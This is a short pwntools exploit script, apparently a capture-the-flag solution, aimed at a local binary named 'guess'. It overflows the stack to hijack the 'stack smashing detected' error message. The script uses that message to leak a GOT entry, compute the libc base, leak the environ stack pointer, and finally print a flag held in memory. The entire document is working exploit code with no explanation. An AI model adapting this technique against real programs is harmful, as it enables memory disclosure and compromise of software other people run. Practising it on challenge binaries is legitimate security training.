from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./guess')
target = process('./guess')
got_puts = elf.got['puts']
payload = ''
payload += fit({0x128:[p64(got_puts)]})
target.sendlineafter('Please type your guessing flag', payload)
target.recvuntil('*** stack smashing detected ***: ')
puts_addr = u64(target.recv(6).ljust(8,'\x00'))
log.success(hex(puts_addr))
libc_base = puts_addr - libc.symbols['puts']
environ_addr = libc_base + libc.symbols['environ']
payload = fit({0x128:[p64(environ_addr)]})
target.sendlineafter('Please type your guessing flag', payload)
target.recvuntil('*** stack smashing detected ***: ')
stack_addr = u64(target.recv(6).ljust(8,'\x00'))
flag_addr = stack_addr - 0x168
payload = fit({0x128:[p64(flag_addr)]})
target.sendlineafter('Please type your guessing flag', payload)
target.interactive()

